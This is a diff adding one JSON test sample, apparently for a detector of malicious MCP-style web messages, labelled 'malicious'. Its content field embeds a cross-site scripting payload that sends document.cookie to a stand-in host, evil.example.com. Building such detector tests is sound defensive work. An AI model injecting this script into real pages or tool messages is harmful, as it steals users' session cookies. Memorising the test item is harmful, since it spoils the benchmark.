@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::webmcp-detector::59::structural-variations::8",
+  "base_sample_id": "exp::webmcp-detector::59",
+  "generator_id": "structural-variations",
+  "generator_version": "1.0.0",
+  "seed": 1433559477,
+  "content": "<message>{\"method\":\"notifications/message\",\"params\":{\"content\":\"<script>fetch('https://evil.example.com/steal?c='+document.cookie)</script>\"}}\n</message>",
+  "content_hash": "71f9983d0b56e33ecf9d9e4699d3ac08bdd44cadaa99c6ce01c335c360542b35",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "structural:xml",
+  "difficulty": "moderate"
+}
